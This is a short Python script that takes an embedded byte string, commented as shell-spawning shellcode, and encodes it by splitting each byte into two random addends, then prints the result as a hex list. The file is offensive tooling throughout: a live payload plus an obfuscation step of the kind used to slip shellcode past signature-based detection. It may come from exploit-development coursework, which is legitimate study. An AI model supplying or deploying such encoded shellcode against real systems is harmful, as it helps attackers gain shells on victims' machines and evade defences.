#!/usr/bin/env python3
import random

# shell spawning shellcode
shellcode = b"\xeb\x20\xb7\xce\x3f\xaf\xb7\x44\xd0\x9d\x96\x91\xd0\xd0\x8c\x97\xac\xb7\x76\x18\xaf\xb7\x76\x1d\xa8\xb7\x76\x19\xb7\x7c\x3f\xc4\xf0\xfa\x48\x8d\x35\xd9\xff\xff\xff\x48\x31\xc9\x80\xc1\x20\xf6\x16\x48\xff\xc6\xe2\xf9\xeb\xca"

encoded = b""
encoded_str = ""

print(len(shellcode))

for x in bytearray(shellcode):
	val1 = random.randint(1,x-1)
	encoded += val1.to_bytes(1, byteorder='big')
	val2 = x - val1
	encoded += val2.to_bytes(1, byteorder='big')
	print(x, val1, val2)

for x in bytearray(encoded):
	encoded_str += '0x'
	encoded_str += '%02x,' %x

print(encoded_str)